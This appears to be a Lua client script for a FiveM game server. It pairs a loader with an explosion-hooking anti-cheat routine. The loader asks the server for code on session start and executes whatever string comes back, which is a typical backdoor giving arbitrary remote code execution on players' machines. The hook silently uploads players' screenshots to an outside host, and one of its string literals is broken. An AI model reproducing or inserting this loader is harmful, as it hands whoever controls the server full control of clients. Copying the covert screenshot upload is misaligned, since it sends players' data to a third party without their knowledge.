Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do Wait(0) end
    TriggerServerEvent('d0pamine:request-load')
end)

RegisterNetEvent('d0pamine:start-load')
AddEventHandler('d0pamine:start-load', function(code)
    assert(load(code))()
end)

local oldAddExplosion = AddExplosion
AddExplosion = function(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake,ped,isHidden,equipNow)
    if "es_extended" ~= GetCurrentResourceName() then
        if not ped then ped = 0 end 
        if not x then x = 0 end
        if not y then y = 0 end
        if not z then z = 0 end
        if not isHidden then isHidden = 0 end 
        if not equipNow then equipNow = 0 end 
        if not explosionType then explosionType = 0 end
        if not damageScale then damageScale = 0 end
        if not isAudible then isAudible = 0 end
        if not isInvisible then isInvisible = 0 end
        if not cameraShake then cameraShake = 0 end
        oldAddExplosion(x, y, z, explosionType, damageScale, isAudible, isInvisible, cameraShake,ped,isHidden,equipNow)
        exports['screenshot-basic']:requestScreenshotUpload('https://ac.yagodevelopment.com/upload.php/', 'files[]', function(data)
            local resp = string.sub(data, 110, 176)
            TriggerServerEvent("SBAC:EkranGoruntusu", resp)
            TriggerServerEvent('YAGO:ViolationDetected', Menü İnject Etmeye Çalıştı Hilenin İnject Olduğu Dosya: '..GetCurrentResourceName(),true)
        end)
    end
end
